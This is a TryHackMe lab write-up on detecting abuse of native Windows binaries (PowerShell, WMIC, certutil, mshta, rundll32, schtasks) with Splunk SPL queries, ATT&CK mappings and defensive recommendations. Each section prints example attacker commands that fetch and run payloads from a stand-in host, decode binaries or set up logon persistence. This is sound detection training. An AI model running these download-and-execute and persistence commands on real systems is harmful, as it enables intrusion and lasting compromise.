# 🏔️ TryHackMe: Living Off the Land (LOLBins) Detection Writeup

**Platform:** TryHackMe  
**Difficulty:** Intermediate  
**Tools Used:** Splunk (SPL), Sysmon, Windows Event Logs  
**MITRE ATT&CK Techniques:** T1059.001 (PowerShell) · T1047 (WMI) · T1140 (Certutil) · T1218.005 (Mshta) · T1218.011 (Rundll32) · T1053.005 (Scheduled Tasks) · T1546.003 (WMI Event Subscriptions)

---

## Overview

Detection-focused room covering Living Off the Land (LOL) techniques — attacks that abuse legitimate, pre-installed Windows utilities to execute malicious code, establish persistence, and move laterally while blending with normal administrative activity. Covered six commonly abused binaries, analyzed real attacker command patterns for each, and built Splunk SPL detection queries to identify malicious usage in SIEM. Also examined real-world threat actor usage from APT29, BlackCat/ALPHV, QakBot, and IcedID campaigns.

---

## Skills Demonstrated

- Identifying malicious usage patterns of six native Windows utilities
- Writing Splunk SPL detection queries targeting process command lines and parent images
- Distinguishing attacker behavior from legitimate admin activity using process context
- Mapping LOL techniques to MITRE ATT&CK and real-world threat actor campaigns
- Understanding why LOL techniques evade traditional AV and application control

---

## Why LOL Techniques Work

Living Off the Land works because the tools are:

- **Already trusted** — signed by Microsoft, allowed by default in most environments
- **Fileless-capable** — code runs in memory without dropping obvious new binaries
- **Policy-exempt** — AppLocker and application control policies often whitelist them
- **Blends with admin traffic** — indistinguishable from legitimate IT operations at surface level

**Key reference collections:**
- **LOLBAS** — Windows native binaries and how they can be abused
- **GTFOBins** — Unix/Linux equivalent

---

## Real-World Threat Actor Usage

| Threat Actor | Tools Abused | Purpose |
|-------------|-------------|---------|
| APT29 (Nobelium) | PowerShell + WMI event subscriptions (T1546.003) | Fileless persistence — payload stored and executed entirely within WMI, zero on-disk artefacts |
| BlackCat/ALPHV | PowerShell, PsExec, certutil | Defence disabling, remote execution, lateral movement, payload staging |
| QakBot / IcedID loaders | rundll32.exe, mshta.exe | Bootstrapping Cobalt Strike beacons in memory via signed Windows binaries |

---

## Technique Breakdown & Detection

---

### 1. PowerShell (T1059.001)

**Why attackers use it:** Runs scripts entirely in memory (fileless), can bypass execution policies, automates downloads and execution, supports encoding to hide intent.

**Common malicious patterns:**
```powershell
# In-memory execution — no file touches disk
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"

# Base64 encoded command — hides intent from simple log filters
powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...

# Download and execute
powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

**Key indicators:** `-Exec Bypass`, `-EncodedCommand`, `IEX`, `DownloadString`, `Invoke-WebRequest`, `-W Hidden`, `-NonI`

**Splunk detection:**
```spl
index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*"
OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*"
OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

---

### 2. WMIC / WMI (T1047)

**Why attackers use it:** Executes commands on remote hosts without touching disk, queries system information, blends with admin behavior, and is often allowed through network controls.

**Common malicious patterns:**
```powershell
# Remote process creation — launch PowerShell payload on another host
wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"

# Remote reconnaissance — list running processes and command lines
wmic /node:TARGETHOST process get name,commandline

# Local hidden process creation
wmic process call create "notepad.exe" /hidden
```

**Key indicators:** `process call create`, `/node:` targeting remote hosts, PowerShell spawned as child of WMI

**Splunk detection:**
```spl
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*"
OR CommandLine="*wmic /node:* process call create*"
OR CommandLine="*wmic*process get Name,CommandLine*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

---

### 3. Certutil (T1140)

**Why attackers use it:** Microsoft-signed binary, widely used in admin workflows, can download files without using curl/wget, decodes base64 payloads into binaries — bypasses simple blocking rules.

**Common malicious patterns:**
```powershell
# Download file — signed binary fetches remote payload
certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe

# Decode base64 payload into executable
certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe

# Encode binary for obfuscated staging/transit
certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
```

**Key indicators:** `-urlcache -split -f`, `-decode`, `-encode`, output paths in `C:\Users\Public\` or `\Temp\`

**Splunk detection:**
```spl
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

---

### 4. Mshta (T1218.005)

**Why attackers use it:** Executes HTA files containing VBScript or JavaScript, can load content remotely or inline, runs in a trusted host context, and can spawn further processes without saved intermediate files.

**Common malicious patterns:**
```powershell
# Remote HTA execution
mshta "http://attacker.example/payload.hta"

# Inline JavaScript spawning PowerShell — no file required
mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"

# Local HTA file dropped as attachment
mshta "C:\Users\Public\malicious.hta"
```

**Key indicators:** `mshta.exe` with remote URLs, `javascript:` inline scripts, `.hta` files in user-writable directories

**Splunk detection:**
```spl
index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe"
(CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLine
```

---

### 5. Rundll32 (T1218.011)

**Why attackers use it:** Executes DLL exports directly, invokes URL handlers to process remote content, and makes malicious code appear as a legitimate Windows process.

**Common malicious patterns:**
```powershell
# Execute malicious DLL export
rundll32.exe C:\Users\Public\backdoor.dll,Start

# Invoke URL handler to process remote content
rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"

# Execute loader DLL from temp directory
rundll32.exe C:\Windows\Temp\loader.dll,Run
```

**Key indicators:** DLLs in `\Users\Public\` or `\Windows\Temp\`, `url.dll,FileProtocolHandler` with remote URLs, unusual DLL export names

**Splunk detection:**
```spl
index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe"
(CommandLine="*\\Users\\Public\\*"
OR CommandLine="*url.dll,FileProtocolHandler*"
OR CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine
```

---

### 6. Scheduled Tasks — schtasks (T1053.005)

**Why attackers use it:** Provides reliable persistence across reboots, executes at logon or on a schedule, tasks can be named to mimic legitimate Windows operations (e.g., `WindowsUpdate`, `Maintenance`), and task creation is an expected admin activity.

**Common malicious patterns:**
```powershell
# Persistence on logon — downloads and executes remote script each login
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""

# Daily scheduled execution of local malicious script
schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05

# Immediate trigger of configured persistence task
schtasks /Run /TN "WindowsUpdate"
```

**Key indicators:** Task names mimicking Windows services, `/TR` pointing to PowerShell with download strings, tasks scheduled at unusual hours, `EventCode=4698` (task created) or `4699` (task deleted)

**Splunk detection:**
```spl
index=wineventlog EventCode=4698 OR EventCode=4699
OR index=sysmon (EventCode=1 OR EventCode=4688)
(CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*"
OR Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine
```

---

## Detection Summary

| Tool | Primary Abuse | Key Splunk Field | Critical Indicators |
|------|--------------|-----------------|-------------------|
| PowerShell | Fileless execution, download/run | CommandLine | `-Exec Bypass`, `IEX`, `-EncodedCommand` |
| WMIC | Remote process creation, recon | CommandLine | `process call create`, `/node:` |
| Certutil | File download, payload decode | Image + CommandLine | `-urlcache -f`, `-decode` |
| Mshta | HTA/script execution | Image + CommandLine | Remote URLs, `javascript:` inline |
| Rundll32 | DLL execution, URL handler abuse | Image + CommandLine | Writable path DLLs, `url.dll,FileProtocolHandler` |
| Schtasks | Persistence on reboot/logon | TaskName + CommandLine | Misleading task names, PowerShell TR actions |

---

## Defensive Recommendations

- **Enable full command-line logging** via Sysmon Event ID 1 or Security Event ID 4688 with command-line auditing — without this, LOL techniques are nearly invisible
- **Apply AppLocker or WDAC policies** to restrict which users can invoke management utilities like WMIC and Mshta
- **Enforce least privilege** — non-administrative users should not have access to system management tools
- **Log PowerShell Script Block Logging** (Event ID 4104) to capture decoded/deobfuscated commands even when `-EncodedCommand` is used
- **Alert on parent-child process anomalies** — `mshta.exe` or `rundll32.exe` spawning PowerShell or cmd.exe is almost always malicious
- **Monitor writable directories** — `C:\Users\Public\` and `C:\Windows\Temp\` are common staging locations

---

## Key Takeaways

- LOL techniques are effective precisely because the tools are legitimate — detection must be behavioral, not signature-based
- Parent-child process relationships are the most reliable detection signal; `mshta.exe` or `rundll32.exe` spawning PowerShell has virtually no legitimate explanation
- `-EncodedCommand` and `IEX` together are a near-certain indicator of malicious PowerShell — legitimate scripts have no need to hide their content
- Scheduled task names are trivially spoofed; always inspect the `/TR` action field, not just the task name
- WMI-based persistence (T1546.003) leaves zero on-disk artefacts — detection requires WMI-specific logging or auditd-equivalent tooling

---

*Part of an ongoing TryHackMe SOC Analyst learning path | Tools: Splunk, Sysmon, Windows Event Logs | Frameworks: MITRE ATT&CK, LOLBAS*
